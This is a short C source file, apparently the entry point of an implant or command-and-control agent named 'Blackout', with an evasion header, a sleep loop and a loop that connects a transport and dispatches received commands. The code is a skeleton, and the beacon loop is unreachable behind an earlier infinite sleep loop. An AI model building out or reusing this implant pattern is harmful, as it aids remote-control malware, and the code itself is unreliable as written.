#include <common.h>
#include <constexpr.h>
#include <evasion.h>

FUNC VOID BlackoutMain(
    _In_ PVOID Param
) {
    BLACKOUT_INSTANCE

    BlackoutInit( Param );

    while( 1 ) {
        SleepMain( Instance()->Session.SleepTime * 1000 );
    }

    do {
        if ( !Instance()->Session.Connected ) {
            if ( TransportInit() )
                CommandDispatcher();
        }
        SleepMain( Instance()->Session.SleepTime * 1000 );
    } while ( TRUE );
}

